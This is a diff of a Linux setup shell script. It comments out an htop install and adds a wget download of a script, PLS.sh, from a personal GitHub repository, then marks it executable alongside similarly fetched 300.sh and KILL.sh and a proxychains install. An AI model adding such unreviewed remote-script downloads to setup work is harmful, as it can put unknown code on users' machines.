@@ -11,9 +11,9 @@ sleep 5
 echo Removing Screensaver
 apt-get remove xscreensaver -y
 
-echo Install Htop
-apt-get install htop -y
-sleep 2
+#echo Install Htop
+#apt-get install htop -y
+#sleep 2
 
 #echo Installing Chromium-Browser
 #sleep 1
@@ -131,6 +131,8 @@ wget https://github.com/mazbron/x/raw/master/300.sh
 chmod +x 300.sh
 wget https://raw.githubusercontent.com/mazbron/x/master/KILL.sh
 chmod +x KILL.sh
+wget https://github.com/mazbron/x/raw/master/PLS.sh
+chmod +x PLS.sh
 apt-get install proxychains -y
 sleep 1
 apt-get install sl -y
